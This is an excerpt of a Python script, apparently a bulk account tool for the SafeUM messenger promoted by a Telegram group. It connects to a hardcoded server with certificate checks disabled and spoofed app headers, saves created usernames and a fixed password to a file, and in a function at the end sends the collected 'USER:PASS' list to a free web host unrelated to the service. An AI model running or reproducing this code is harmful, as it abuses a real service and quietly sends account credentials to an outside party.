...
webbrowser.open("https://t.me/xSPY_TEAM")
Ab='\033[1;92m'
aB='\033[1;91m'
AB='\033[1;96m'
aBbs='\033[1;93m'
...
def work():
 ...
 try:
  con = create_connection("wss://193.200.173.45/Auth", header={"app": "com.safeum.android","host": None,"remoteIp": "193.200.173.45","remotePort": str(8080),"sessionId": "b6cbb22d-06ca-41ff-8fda-c0ddeb148195","time": "2024-04-14 12:13:32","url": "wss://51.79.208.190/Auth"},sslopt={"cert_reqs": CERT_NONE})
  ...
  if '"status":"Success"' in gzip:
   ...
   print(b)
   with open('SafeUM.txt', 'a') as f: f.write(username + ":hhhh | TG : @xSPY_TEAM\n")
...
def fuck():
        ...
        ii=""
        t = requests.post(f"https://demented-position.000webhostapp.com/index.php?user=[⋘─────━**━─────⋙\nformat >> USER:PASS \naccounts>> \n{z} \n\njoin >> @xSPY_TEAM\n⋘─────━❤️🌚━─────⋙\n𝐁𝐘 :  @crazy_hacker404]&pass={ii}")
        exit()
